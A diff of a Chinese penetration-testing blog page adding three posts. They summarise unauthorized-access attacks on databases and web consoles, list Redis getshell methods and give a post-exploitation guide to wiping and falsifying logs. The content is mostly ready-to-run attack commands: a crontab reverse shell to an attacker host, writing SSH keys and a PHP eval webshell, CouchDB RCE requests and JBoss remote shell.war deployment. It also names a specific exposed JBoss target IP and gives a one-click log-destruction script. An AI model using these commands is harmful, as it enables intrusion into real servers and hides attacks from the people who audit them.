@@ -258,6 +258,598 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/10/常见未授权访问漏洞总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2021/01/10/常见未授权访问漏洞总结/" itemprop="url">
+                  常见未授权访问漏洞总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-10T18:18:52+08:00">
+                2021-01-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/01/10/常见未授权访问漏洞总结/" class="leancloud_visitors" data-flag-title="常见未授权访问漏洞总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。</p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell</p>
+<p>工具：Navicat</p>
+<h2 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h2><p>1433端口未授权访问，可读取数据库内容，可尝试执行master..cmdshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;whoami&apos;</span><br><span class="line">exec master..cmdshell &apos;dir c:\&apos;</span><br></pre></td></tr></table></figure></p>
+<p>工具：Navicat</p>
+<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>工具：Navicat，Robo3T</p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>可通过四种方式getshell：写webshell、写crontabs、写ssh公钥、Redis主从复制(4.x,5.x)</p>
+<p>工具：Redis-cli,fofa:protocol=redis</p>
+<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop webUI界面未授权访问，如果存在New Application API功能，可尝试getshell</p>
+<p>工具：浏览器，<a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p>
+<h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>9200端口未授权访问，可非法操作数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip:9200/_plugin/head/  web管理界面</span><br><span class="line">http://ip:9200/_cat/indices  查看集群当前状态</span><br><span class="line">http://ip:9200/_nodes  查看节点数据</span><br><span class="line">http://ip:9200/_river/_search  查看数据库敏感信息</span><br></pre></td></tr></table></figure></p>
+<p>工具：浏览器</p>
+<h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>2181，2182端口未授权访问，可读取敏感信息，或者在Zookeeper集群内执行kill命令</p>
+<p>工具：netcat，<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip" target="_blank" rel="noopener">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><p>SpringBoot，web中env路径配置文件未授权访问，可暴露大量联动设备密码信息</p>
+<p>工具：浏览器</p>
+<h2 id="ds-store"><a href="#ds-store" class="headerlink" title="ds_store"></a>ds_store</h2><p><a href="http://ip/.ds_store未授权访问，可通过github工具下载web目录" target="_blank" rel="noopener">http://ip/.ds_store未授权访问，可通过github工具下载web目录</a></p>
+<p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p>
+<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>vnc用于远程桌面控制，默认端口在5900-5905之间，此类端口未授权访问会导致恶意用户直接控制受控主机</p>
+<p>工具：VNCview</p>
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker的2375端口web未授权访问，可通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</p>
+<p>工具：浏览器</p>
+<h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>Jenkins面板<a href="http://ip:8080/manage" target="_blank" rel="noopener">http://ip:8080/manage</a><br>未授权访问会允许用户选择执行脚本界面，操作一些系统层命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;whoami&quot;.execute().text 命令执行</span><br><span class="line">new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;); 写webshell</span><br></pre></td></tr></table></figure>
+<p>工具：浏览器</p>
+<h2 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h2><p>Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet ip 11211 或 nc -vv &lt;target&gt; 11211</span><br><span class="line">无需用户名密码，可以直接连接memcache服务的11211端口</span><br><span class="line">stats #查看memcache服务状态</span><br></pre></td></tr></table></figure>
+<p>工具：netcat，telnet</p>
+<h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>JBOSS的webUI界面<a href="http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell" target="_blank" rel="noopener">http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">点击JMX CONSOLE未授权访问</span><br><span class="line">点击jboss.deployment中的deploymentScanner进入应用部署页面</span><br><span class="line">使用apache搭建远程木马服务器shell.war</span><br><span class="line">addurl-java.lang.String配置访问木马地址http://&lt;ip&gt;/shell.war</span><br><span class="line">访问http://ip:8080/shell/</span><br></pre></td></tr></table></figure>
+<p><a href="http://221.229.247.184:8080/jmx-console/" target="_blank" rel="noopener">http://221.229.247.184:8080/jmx-console/</a></p>
+<p>工具：浏览器，fofa：”JBoss Management”</p>
+<h2 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h2><p>.svn目录未授权访问，可能导致大量源码泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn-extractor.py --url &quot;url with .svn available&quot;</span><br></pre></td></tr></table></figure>
+<p>工具：<a href="https://github.com/anantshri/svn-extractor" target="_blank" rel="noopener">https://github.com/anantshri/svn-extractor</a></p>
+<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>.git目录未授权访问，可能导致大量源码泄露</p>
+<p>方法1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -r -p -np -k http://www.xxx.com/.git/ #先递归批量下载.git目录</span><br><span class="line">git log #查看网站的提交记录</span><br><span class="line">git reset --hard [log hash] #恢复到指定版本号</span><br></pre></td></tr></table></figure></p>
+<p>方法2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.xxx.com/.git/</span><br></pre></td></tr></table></figure></p>
+<p>工具：git,<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
+<h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install nfs-common 安装nfs客户端</span><br><span class="line">showmount -e xx.xx.xx.xx 查看nfs服务器上的共享目录</span><br><span class="line">mount -t nfs xx.xx.xx.xx:/grdata /mnt 挂载到本地</span><br><span class="line">umount /mnt 卸载目录</span><br></pre></td></tr></table></figure>
+<h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB的webui未授权访问时，可通过 <a href="http://xx.xx.xx.xx:5984/_utils/" target="_blank" rel="noopener">http://xx.xx.xx.xx:5984/_utils/</a> 页面创建管理员用户，并通过put方式远程代码执行（CVE-2017-12635）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure>
+<p>工具：curl，<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/24/redis未授权getshell的多种方式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/12/24/redis未授权getshell的多种方式/" itemprop="url">
+                  redis未授权getshell的多种方式
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T14:55:20+08:00">
+                2020-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/12/24/redis未授权getshell的多种方式/" class="leancloud_visitors" data-flag-title="redis未授权getshell的多种方式">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis未授权访问或弱密码，是常见的重要入口点之一，由于其可以写文件的特性，就产生了多种getshell的方式。</p>
+<h2 id="redis连接方式"><a href="#redis连接方式" class="headerlink" title="redis连接方式"></a>redis连接方式</h2><p>下载需要的版本的redis-cli：</p>
+<p><a href="http://download.redis.io/releases/" target="_blank" rel="noopener">http://download.redis.io/releases/</a></p>
+<p>安装使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf redis-x.x.x（版本）.tar.gz</span><br><span class="line">cd redis-x.x.x</span><br><span class="line">make</span><br><span class="line">cp src/redis-cli /usr/bin/</span><br><span class="line">./redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure>
+<h2 id="写定时任务crontabs"><a href="#写定时任务crontabs" class="headerlink" title="写定时任务crontabs"></a>写定时任务crontabs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/1551 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">save</span><br><span class="line">nc -v -l -p 1551</span><br></pre></td></tr></table></figure>
+<h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>本地生成公私钥对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>
+<p>连接redis，将刚才生成的公钥要在下面命令中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUi1zueNmGKBCLMxRTHW5+VZ0Z0G5FjGapaV3NhzIcUQcHl+U9KkYoCIIXgXUrZc5xBBzaS+jdefiJobx2PXEKKssaGMBGFJ9vC+iRUYjoqCExzSXE6Lv52nqfp2JgKL2wu1yC/b5alIfVrj4N8PgDtLiEKz2DMwpXP8VPz0UUXpMgx4ASFnLYP5QB2mYY2LRvRkoydGnc61GAJiwCzSczx3kXCwAmZXGnS37892NKlFNshghqXsVhSnaHYHZNNtcRj2yD2poo0ZAHOJFT0TOcyj2HpMr821l6WxpjpeTAYnFeSAB8s9P9atC+RmyIZBg8w6cOpvL99Vf+LpcnRld4aDHZ4dKeXQjntQVdBtObqtaUen64cTpLvq+mYbBsoprRgyaHI+7NPWNm4HxkGzl3rYK3ujnbAmy2iwu4J9Skil4v5bL+i1lMWQovBU03AxOztx2MA7jUmyciKT+fp6pszWqN8okmQs78Cujp9IFJYgd6NfH3IjTBmaogkvnDEH8= root@kali\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>根据实际情况寻找web路径，写webshell并访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set xx &quot;&lt;?php @eval($_POST[&apos;cmd&apos;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p>redis主从复制漏洞无需目标root权限启动redis，可以反弹一个redis权限的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/redis-rogue-server.git</span><br><span class="line">./redis-rogue-server.py --rhost 172.18.2.177 --lhost 170.170.64.14</span><br></pre></td></tr></table></figure></p>
+<h2 id="windows下思路"><a href="#windows下思路" class="headerlink" title="windows下思路"></a>windows下思路</h2><ul>
+<li><p>写入webshell</p>
+</li>
+<li><p>写入启动项</p>
+</li>
+<li><p>Windows2003写入MOF</p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/11/后渗透阶段清理痕迹方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/11/11/后渗透阶段清理痕迹方式总结/" itemprop="url">
+                  后渗透阶段清理痕迹方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-11T23:19:34+08:00">
+                2020-11-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/11/11/后渗透阶段清理痕迹方式总结/" class="leancloud_visitors" data-flag-title="后渗透阶段清理痕迹方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文分别对windows和linux上清理痕迹的方式做一个总结。</p>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>有远程桌面权限时手动删除日志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</span><br></pre></td></tr></table></figure></p>
+<p>wevtutil<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    清理安全日志</span><br></pre></td></tr></table></figure></p>
+<p>meterperter自带清除日志功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev     清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure></p>
+<p>清除recent</p>
+<p>在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮</p>
+<p>或直接打开C:\Users\Administrator\Recent并删除所有内容</p>
+<p>或在命令行中输入del /f /s /q “%userprofile%\Recent*.*</p>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="清除命令历史记录"><a href="#清除命令历史记录" class="headerlink" title="清除命令历史记录"></a>清除命令历史记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">histroy -r          #删除当前会话历史记录</span><br><span class="line">history -c          #删除内存中的所有命令历史</span><br><span class="line">rm .bash_history   #删除历史文件中的内容</span><br><span class="line">HISTZISE=0          #通过设置历史命令条数来清除所有历史记录</span><br></pre></td></tr></table></figure>
+<h3 id="在隐蔽的位置执行命令"><a href="#在隐蔽的位置执行命令" class="headerlink" title="在隐蔽的位置执行命令"></a>在隐蔽的位置执行命令</h3><p>使用vim打开文件执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set history=0</span><br><span class="line">:!command</span><br></pre></td></tr></table></figure></p>
+<h3 id="linux日志文件"><a href="#linux日志文件" class="headerlink" title="linux日志文件"></a>linux日志文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/var/run/utmp 记录现在登入的用户</span><br><span class="line">/var/log/wtmp 记录用户所有的登入和登出</span><br><span class="line">/var/log/lastlog 记录每一个用户最后登入时间</span><br><span class="line">/var/log/btmp 记录错误的登入尝试</span><br><span class="line">/var/log/auth.log 需要身份确认的操作</span><br><span class="line">/var/log/secure 记录安全相关的日志信息</span><br><span class="line">/var/log/maillog 记录邮件相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br><span class="line">/var/log/cron 记录定时任务相关的日志信息</span><br><span class="line">/var/log/spooler 记录UUCP和news设备相关的日志信息</span><br><span class="line">/var/log/boot.log 记录守护进程启动和停止相关的日志消息</span><br></pre></td></tr></table></figure>
+<p>完全删除日志文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line">echo &quot;&quot; &gt; filename</span><br><span class="line">echo &gt; filename</span><br></pre></td></tr></table></figure></p>
+<p>针对性删除日志文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除当天日志</span><br><span class="line">sed  -i &apos;/当天日期/&apos;d  filename</span><br></pre></td></tr></table></figure></p>
+<p>篡改日志文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将所有170.170.64.17ip替换为127.0.0.1</span><br><span class="line">sed -i &apos;s/170.170.64.17/127.0.0.1/g&apos;</span><br></pre></td></tr></table></figure></p>
+<p>一键清除脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/bash</span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/09/常见web系统默认口令总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -635,6 +1227,384 @@
 <p>即可将客户端网络作为代理出口使用</p>
